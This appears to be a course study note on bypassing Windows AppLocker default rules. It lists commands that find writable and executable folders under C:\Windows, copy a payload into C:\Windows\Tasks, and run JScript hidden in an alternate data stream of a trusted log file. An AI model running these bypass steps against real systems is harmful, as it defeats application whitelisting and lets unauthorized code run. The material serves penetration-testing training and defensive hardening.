# 07.01 AppLocker Default Rules Trusted Folders

> Section 8.1-8.2 · Default rules allow C:\Windows — find writable+executable dirs

## Overview

AppLocker default rules allow all users to run executables from C:\Program Files, C:\Program Files (x86), and C:\Windows recursively. Assumption: non-admin users cannot write there. Reality: some subdirectories under C:\Windows allow write AND execute (RX) for Authenticated Users — e.g. C:\Windows\Tasks.

## Steps

- **Find writable dirs** — `AccessChk.exe -u -w C:\Windows -s` (shows writable dirs under C:\Windows).
- **Verify executable bit** — `icacls C:\Windows\Tasks` — look for `(RX)` for Authenticated Users.
- **Copy payload** — `copy payload.exe C:\Windows\Tasks\payload.exe`.
- **Execute** — payload runs because it's in a whitelisted path.

## Commands

### Find writable dirs under C:\Windows

```cmd
C:\Tools\SysInternalsSuite\accesschk.exe -u -w C:\Windows -s 2>nul

REM Then verify icacls on each candidate:
icacls C:\Windows\Tasks
REM Look for: NT AUTHORITY\Authenticated Users:(RX)
```

### ADS bypass (write JScript to trusted .log file)

```cmd
REM Write JScript to an alternate data stream of a trusted, writable file
type C:\Users\student\test.js > "C:\TeamViewer\TeamViewer12_Logfile.log:test.js"

REM Verify:
dir /r C:\TeamViewer\TeamViewer12_Logfile.log

REM Execute from the ADS:
wscript C:\TeamViewer\TeamViewer12_Logfile.log:test.js
```
